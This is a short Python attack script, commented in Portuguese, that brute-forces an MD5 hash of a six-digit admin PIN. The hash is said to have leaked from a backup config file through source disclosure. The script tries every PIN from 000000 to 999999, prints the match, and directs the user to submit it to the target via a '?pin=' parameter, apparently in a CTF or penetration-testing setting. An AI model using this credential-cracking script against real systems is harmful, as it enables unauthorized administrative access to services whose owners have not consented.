import hashlib, time

# md5 do PIN admin (6 digitos), vazado em config.php.bak (source disclosure)
TARGET = "1a31076f2aeb1e7d69120c9f85c3a8da"

def main():
    print(f"[*] crackeando md5 do PIN admin: {TARGET}")
    print(f"[*] espaco: 000000..999999 (10^6) -> instantaneo")
    t0 = time.time()
    md5 = hashlib.md5
    for n in range(1_000_000):
        pin = f"{n:06d}"
        if md5(pin.encode()).hexdigest() == TARGET:
            print(f"[+] ACHOU: pin = {pin}  ({time.time() - t0:.3f}s, {n:,} tentativas)")
            print(f"[+] submeta no alvo:  ?pin={pin}")
            return
    print("[!] nao achou em 6 digitos zero-padded — avisar pra ajustar")

if __name__ == "__main__":
    main()
